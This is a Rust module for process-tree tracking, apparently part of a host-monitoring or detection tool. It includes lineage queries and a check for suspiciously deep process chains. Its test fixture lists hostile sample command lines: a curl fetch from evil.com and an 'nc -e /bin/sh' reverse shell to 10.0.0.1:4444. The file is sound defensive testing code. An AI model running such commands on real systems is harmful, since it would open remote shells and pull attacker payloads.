// Process tree tracking with parent-child relationships and lineage queries.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// A node in the process tree.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessNode {
    pub pid: u32,
    pub ppid: u32,
    pub name: String,
    pub cmd_line: Option<String>,
    pub start_time: Option<String>,
    pub user: Option<String>,
    pub exe_path: Option<String>,
    pub exe_hash: Option<String>,
    pub hostname: String,
    /// Whether this process is still running.
    pub alive: bool,
}

/// Process tree maintaining parent-child relationships.
pub struct ProcessTree {
    nodes: HashMap<u32, ProcessNode>,
    /// Map of ppid -> list of child PIDs for fast lookups.
    children: HashMap<u32, Vec<u32>>,
    hostname: String,
}

impl ProcessTree {
    pub fn new(hostname: &str) -> Self {
        Self {
            nodes: HashMap::new(),
            children: HashMap::new(),
            hostname: hostname.into(),
        }
    }

    /// Insert or update a process node.
    pub fn upsert(&mut self, node: ProcessNode) {
        let pid = node.pid;
        let ppid = node.ppid;
        self.nodes.insert(pid, node);
        self.children.entry(ppid).or_default().push(pid);
    }

    /// Mark a process as terminated.
    pub fn mark_terminated(&mut self, pid: u32) {
        if let Some(node) = self.nodes.get_mut(&pid) {
            node.alive = false;
        }
    }

    /// Get a process node by PID.
    pub fn get(&self, pid: u32) -> Option<&ProcessNode> {
        self.nodes.get(&pid)
    }

    /// Get direct children of a PID.
    pub fn children_of(&self, pid: u32) -> Vec<&ProcessNode> {
        self.children.get(&pid)
            .map(|pids| pids.iter().filter_map(|p| self.nodes.get(p)).collect())
            .unwrap_or_default()
    }

    /// Get full ancestry (lineage) from a PID up to init/root.
    pub fn lineage(&self, pid: u32) -> Vec<&ProcessNode> {
        let mut result = Vec::new();
        let mut current = pid;
        let mut visited = std::collections::HashSet::new();

        while let Some(node) = self.nodes.get(&current) {
            if !visited.insert(current) { break; } // Cycle protection
            result.push(node);
            if node.ppid == 0 || node.ppid == current { break; }
            current = node.ppid;
        }
        result
    }

    /// Get all descendants of a PID (recursive subtree).
    pub fn descendants(&self, pid: u32) -> Vec<&ProcessNode> {
        let mut result = Vec::new();
        let mut stack = vec![pid];
        while let Some(p) = stack.pop() {
            if let Some(kids) = self.children.get(&p) {
                for &kid in kids {
                    if let Some(node) = self.nodes.get(&kid) {
                        result.push(node);
                        stack.push(kid);
                    }
                }
            }
        }
        result
    }

    /// Find processes by name (case-insensitive substring match).
    pub fn find_by_name(&self, name: &str) -> Vec<&ProcessNode> {
        let nl = name.to_lowercase();
        self.nodes.values()
            .filter(|n| n.name.to_lowercase().contains(&nl))
            .collect()
    }

    /// Find processes by command line pattern.
    pub fn find_by_cmdline(&self, pattern: &str) -> Vec<&ProcessNode> {
        let pl = pattern.to_lowercase();
        self.nodes.values()
            .filter(|n| n.cmd_line.as_ref().map_or(false, |c| c.to_lowercase().contains(&pl)))
            .collect()
    }

    /// Get all alive processes.
    pub fn alive_processes(&self) -> Vec<&ProcessNode> {
        self.nodes.values().filter(|n| n.alive).collect()
    }

    /// Get total process count.
    pub fn len(&self) -> usize {
        self.nodes.len()
    }

    pub fn is_empty(&self) -> bool {
        self.nodes.is_empty()
    }

    /// Detect suspiciously deep process chains (often indicator of injection/privilege escalation).
    pub fn deep_chains(&self, depth_threshold: usize) -> Vec<Vec<&ProcessNode>> {
        let mut results = Vec::new();
        for &pid in self.nodes.keys() {
            let lineage = self.lineage(pid);
            if lineage.len() >= depth_threshold {
                results.push(lineage);
            }
        }
        results
    }

    /// Export tree as a flat list of nodes for serialization.
    pub fn export(&self) -> Vec<ProcessNode> {
        self.nodes.values().cloned().collect()
    }

    /// Collect processes from the current host (simplified cross-platform).
    pub fn collect_current_host(&mut self) {
        #[cfg(target_os = "linux")]
        self.collect_linux();

        #[cfg(target_os = "macos")]
        self.collect_macos();

        #[cfg(target_os = "windows")]
        self.collect_windows();
    }

    #[cfg(target_os = "linux")]
    fn collect_linux(&mut self) {
        use std::fs;
        if let Ok(entries) = fs::read_dir("/proc") {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if let Ok(pid) = name.parse::<u32>() {
                    let stat_path = format!("/proc/{}/stat", pid);
                    if let Ok(stat) = fs::read_to_string(&stat_path) {
                        let parts: Vec<&str> = stat.split_whitespace().collect();
                        if parts.len() > 3 {
                            let proc_name = parts[1].trim_matches(|c| c == '(' || c == ')').to_string();
                            let ppid = parts[3].parse::<u32>().unwrap_or(0);
                            let cmd_line = fs::read_to_string(format!("/proc/{}/cmdline", pid))
                                .ok()
                                .map(|s| s.replace('\0', " ").trim().to_string())
                                .filter(|s| !s.is_empty());
                            self.upsert(ProcessNode {
                                pid, ppid, name: proc_name, cmd_line,
                                start_time: None, user: None, exe_path: None, exe_hash: None,
                                hostname: self.hostname.clone(), alive: true,
                            });
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    fn collect_macos(&mut self) {
        if let Ok(output) = std::process::Command::new("ps")
            .args(["-eo", "pid,ppid,comm"])
            .output()
        {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines().skip(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 3 {
                    if let (Ok(pid), Ok(ppid)) = (parts[0].parse::<u32>(), parts[1].parse::<u32>()) {
                        let name = parts[2..].join(" ");
                        self.upsert(ProcessNode {
                            pid, ppid, name, cmd_line: None,
                            start_time: None, user: None, exe_path: None, exe_hash: None,
                            hostname: self.hostname.clone(), alive: true,
                        });
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    fn collect_windows(&mut self) {
        if let Ok(output) = std::process::Command::new("wmic")
            .args(["process", "get", "ProcessId,ParentProcessId,Name", "/format:csv"])
            .output()
        {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines().skip(2) {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() >= 4 {
                    let name = parts[1].to_string();
                    if let (Ok(ppid), Ok(pid)) = (parts[2].parse::<u32>(), parts[3].trim().parse::<u32>()) {
                        self.upsert(ProcessNode {
                            pid, ppid, name, cmd_line: None,
                            start_time: None, user: None, exe_path: None, exe_hash: None,
                            hostname: self.hostname.clone(), alive: true,
                        });
                    }
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_tree() -> ProcessTree {
        let mut tree = ProcessTree::new("test-host");
        tree.upsert(ProcessNode { pid: 1, ppid: 0, name: "init".into(), cmd_line: Some("/sbin/init".into()), start_time: None, user: Some("root".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
        tree.upsert(ProcessNode { pid: 100, ppid: 1, name: "sshd".into(), cmd_line: Some("/usr/sbin/sshd -D".into()), start_time: None, user: Some("root".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
        tree.upsert(ProcessNode { pid: 200, ppid: 100, name: "bash".into(), cmd_line: Some("/bin/bash".into()), start_time: None, user: Some("user".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
        tree.upsert(ProcessNode { pid: 300, ppid: 200, name: "python3".into(), cmd_line: Some("python3 exploit.py".into()), start_time: None, user: Some("user".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
        tree.upsert(ProcessNode { pid: 301, ppid: 200, name: "curl".into(), cmd_line: Some("curl http://evil.com/payload".into()), start_time: None, user: Some("user".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
        tree.upsert(ProcessNode { pid: 400, ppid: 300, name: "nc".into(), cmd_line: Some("nc -e /bin/sh 10.0.0.1 4444".into()), start_time: None, user: Some("user".into()), exe_path: None, exe_hash: None, hostname: "test-host".into(), alive: true });
        tree
    }

    #[test]
    fn get_node() {
        let tree = sample_tree();
        let node = tree.get(100).unwrap();
        assert_eq!(node.name, "sshd");
        assert_eq!(node.ppid, 1);
    }

    #[test]
    fn children() {
        let tree = sample_tree();
        let kids = tree.children_of(200);
        assert_eq!(kids.len(), 2);
        let names: Vec<&str> = kids.iter().map(|n| n.name.as_str()).collect();
        assert!(names.contains(&"python3"));
        assert!(names.contains(&"curl"));
    }

    #[test]
    fn lineage_to_root() {
        let tree = sample_tree();
        let lineage = tree.lineage(400);
        assert_eq!(lineage.len(), 5); // nc -> python3 -> bash -> sshd -> init
        assert_eq!(lineage[0].name, "nc");
        assert_eq!(lineage.last().unwrap().name, "init");
    }

    #[test]
    fn descendants() {
        let tree = sample_tree();
        let desc = tree.descendants(100);
        assert!(desc.len() >= 4); // bash, python3, curl, nc
    }

    #[test]
    fn find_by_name() {
        let tree = sample_tree();
        let found = tree.find_by_name("python");
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].pid, 300);
    }

    #[test]
    fn find_by_cmdline() {
        let tree = sample_tree();
        let found = tree.find_by_cmdline("evil.com");
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].name, "curl");
    }

    #[test]
    fn mark_terminated() {
        let mut tree = sample_tree();
        tree.mark_terminated(300);
        assert!(!tree.get(300).unwrap().alive);
        assert_eq!(tree.alive_processes().len(), 5);
    }

    #[test]
    fn deep_chains() {
        let tree = sample_tree();
        let deep = tree.deep_chains(4);
        assert!(!deep.is_empty(), "nc chain has depth 4+");
    }

    #[test]
    fn export() {
        let tree = sample_tree();
        let exported = tree.export();
        assert_eq!(exported.len(), 6);
    }

    #[test]
    fn cycle_protection() {
        let mut tree = ProcessTree::new("test");
        // Create a cycle: A -> B -> A
        tree.upsert(ProcessNode { pid: 10, ppid: 20, name: "a".into(), cmd_line: None, start_time: None, user: None, exe_path: None, exe_hash: None, hostname: "test".into(), alive: true });
        tree.upsert(ProcessNode { pid: 20, ppid: 10, name: "b".into(), cmd_line: None, start_time: None, user: None, exe_path: None, exe_hash: None, hostname: "test".into(), alive: true });
        let lineage = tree.lineage(10);
        assert!(lineage.len() <= 2, "Cycle should be detected");
    }
}
